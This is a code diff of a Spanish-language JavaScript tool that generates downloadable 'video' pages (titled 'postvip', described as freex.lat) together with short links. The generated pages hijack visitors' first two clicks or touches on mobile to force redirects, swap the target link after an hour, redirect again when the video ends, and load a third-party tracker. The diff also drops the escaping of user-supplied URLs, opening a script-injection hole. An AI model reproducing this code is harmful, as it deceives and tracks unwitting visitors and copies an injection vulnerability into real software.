@@ -95,13 +95,11 @@
     </div>
 
     <script>
-        // Definir el dominio
         const dominio = 'https://testphp-tau.vercel.app/';
 
-        // Función para generar ID único
         function generarIdUnico() {
             const caracteres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            const longitud = Math.floor(Math.random() * 2) + 4; // 4 o 5 caracteres
+            const longitud = Math.floor(Math.random() * 2) + 4;
             let resultado = '';
             for (let i = 0; i < longitud; i++) {
                 resultado += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
@@ -109,119 +107,73 @@
             return resultado;
         }
 
-        // Función para generar el HTML del video
         function generarCodigoHTML(videoEnlace, redireccionEnlace, horaCreacion) {
-            return `<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>postvip</title>
-    <meta name="description" content="Mira este video en freex.lat">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background: #f4f4f4;
-            margin: 0;
-        }
-        .video-container {
-            width: 100%;
-            max-width: 90%;
-            margin: 0 auto;
-            background-color: #fff;
-            border-radius: 15px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-        }
-        .video-container video {
-            width: 100%;
-            height: auto;
-        }
-        .btn {
-            padding: 12px 20px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background 0.3s;
-            text-align: center;
-        }
-        .btn:hover {
-            background-color: #45a049;
-        }
-    </style>
-    <script>
-        // Verificar la hora de creación de la entrada
-        const horaCreacion = ${horaCreacion};
-        const enlaceOriginal = "${redireccionEnlace.replace(/"/g, '\\"')}";
-        const enlaceNuevo = "tulink";
-        const maxRedirects = 2;
-        
-        // Función que verifica si han pasado más de una hora
-        function verificarHoraCreacion() {
-            const horaActual = Math.floor(Date.now() / 1000); // Obtener hora actual en timestamp
-            const diferencia = horaActual - horaCreacion;
-            return diferencia >= 3600; // Si han pasado más de 3600 segundos (1 hora)
-        }
-
-        const redirectUrl = verificarHoraCreacion() ? enlaceNuevo : enlaceOriginal;
-
-        if (!sessionStorage.getItem("sessionStarted")) {
-            localStorage.removeItem("clickCount");
-            sessionStorage.setItem("sessionStarted", "true");
+            const html = '<!DOCTYPE html>' +
+                '<html lang="en">' +
+                '<head>' +
+                '<meta charset="utf-8">' +
+                '<meta name="viewport" content="width=device-width, initial-scale=1.0">' +
+                '<title>postvip</title>' +
+                '<meta name="description" content="Mira este video en freex.lat">' +
+                '<style>' +
+                '* { margin: 0; padding: 0; box-sizing: border-box; }' +
+                'body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #f4f4f4; margin: 0; }' +
+                '.video-container { width: 100%; max-width: 90%; margin: 0 auto; background-color: #fff; border-radius: 15px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); overflow: hidden; }' +
+                '.video-container video { width: 100%; height: auto; }' +
+                '</style>' +
+                '<script>' +
+                'const horaCreacion = ' + horaCreacion + ';' +
+                'const enlaceOriginal = "' + redireccionEnlace + '";' +
+                'const enlaceNuevo = "tulink";' +
+                'const maxRedirects = 2;' +
+                'function verificarHoraCreacion() {' +
+                'const horaActual = Math.floor(Date.now() / 1000);' +
+                'const diferencia = horaActual - horaCreacion;' +
+                'return diferencia >= 3600;' +
+                '}' +
+                'const redirectUrl = verificarHoraCreacion() ? enlaceNuevo : enlaceOriginal;' +
+                'if (!sessionStorage.getItem("sessionStarted")) {' +
+                'localStorage.removeItem("clickCount");' +
+                'sessionStorage.setItem("sessionStarted", "true");' +
+                '}' +
+                'let clickCount = parseInt(localStorage.getItem("clickCount")) || 0;' +
+                'function handleClick(event) {' +
+                'clickCount++;' +
+                'localStorage.setItem("clickCount", clickCount);' +
+                'if (clickCount <= maxRedirects) {' +
+                'window.location.href = redirectUrl;' +
+                'event.preventDefault();' +
+                '} else {' +
+                'document.getElementById("videoPlayer").setAttribute("controls", "controls");' +
+                '}' +
+                '}' +
+                'if (/Mobi|Android/i.test(navigator.userAgent)) {' +
+                'document.addEventListener("click", handleClick, true);' +
+                'document.addEventListener("touchstart", handleClick, true);' +
+                '}' +
+                '</script>' +
+                '<script>' +
+                'document.addEventListener("DOMContentLoaded", function () {' +
+                'var video = document.getElementById("videoPlayer");' +
+                'video.addEventListener("ended", function () {' +
+                'window.location.href = "' + redireccionEnlace + '";' +
+                '});' +
+                '});' +
+                '</script>' +
+                '</head>' +
+                '<body>' +
+                '<div class="video-container">' +
+                '<video id="videoPlayer" src="' + videoEnlace + '" autoplay muted></video>' +
+                '<div class="overlay">' +
+                '<script id="_wauvpc">var _wau = _wau || []; _wau.push(["classic", "52cru94v9e", "vpc"]);</script>' +
+                '<script async src="//waust.at/c.js"></script>' +
+                '</div>' +
+                '</div>' +
+                '</body>' +
+                '</html>';
+            return html;
         }
 
-        let clickCount = parseInt(localStorage.getItem("clickCount")) || 0;
-
-        function handleClick(event) {
-            clickCount++;
-            localStorage.setItem("clickCount", clickCount);
-            if (clickCount <= maxRedirects) {
-                window.location.href = redirectUrl;
-                event.preventDefault();
-            } else {
-                document.getElementById("videoPlayer").setAttribute("controls", "controls");
-            }
-        }
-
-        if (/Mobi|Android/i.test(navigator.userAgent)) {
-            document.addEventListener("click", handleClick, true);
-            document.addEventListener("touchstart", handleClick, true);
-        }
-    </script>
-    <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            var video = document.getElementById("videoPlayer");
-            video.addEventListener("ended", function () {
-                window.location.href = "${redireccionEnlace.replace(/"/g, '\\"')}";
-            });
-        });
-    </script>
-</head>
-<body>
-    <div class="video-container">
-        <video id="videoPlayer" src="${videoEnlace.replace(/"/g, '\\"')}" autoplay muted></video>
-        <div class="overlay">
-            <script id="_wauvpc">var _wau = _wau || []; _wau.push(["classic", "52cru94v9e", "vpc"]);</script>
-            <script async src="//waust.at/c.js"></script>
-        </div>
-    </div>
-</body>
-</html>`;
-        }
-
-        // Manejar el envío del formulario
         document.getElementById('entryForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -229,16 +181,10 @@
             const redireccionEnlace = document.getElementById('redireccion_enlace').value;
             
             if (videoEnlace && redireccionEnlace) {
-                // Generar ID único
                 const idEntrada = generarIdUnico();
-                
-                // Obtener hora actual
                 const horaCreacion = Math.floor(Date.now() / 1000);
-                
-                // Generar el código HTML
                 const codigoHTML = generarCodigoHTML(videoEnlace, redireccionEnlace, horaCreacion);
                 
-                // Crear y descargar el archivo
                 const blob = new Blob([codigoHTML], { type: 'text/html' });
                 const url = URL.createObjectURL(blob);
                 const a = document.createElement('a');
@@ -249,17 +195,14 @@
                 document.body.removeChild(a);
                 URL.revokeObjectURL(url);
                 
-                // Generar el enlace completo
                 const enlaceCompleto = dominio + '5/' + idEntrada;
                 
-                // Mostrar resultado
                 document.getElementById('enlace').value = enlaceCompleto;
                 document.getElementById('formContainer').style.display = 'none';
                 document.getElementById('resultContainer').style.display = 'block';
             }
         });
 
-        // Función para copiar enlace
         function copiarEnlace() {
             const input = document.getElementById("enlace");
             input.select();
@@ -267,7 +210,6 @@
             alert("¡Enlace copiado al portapapeles!");
         }
 
-        // Función para crear otra entrada
         function crearOtra() {
             document.getElementById('formContainer').style.display = 'block';
             document.getElementById('resultContainer').style.display = 'none';
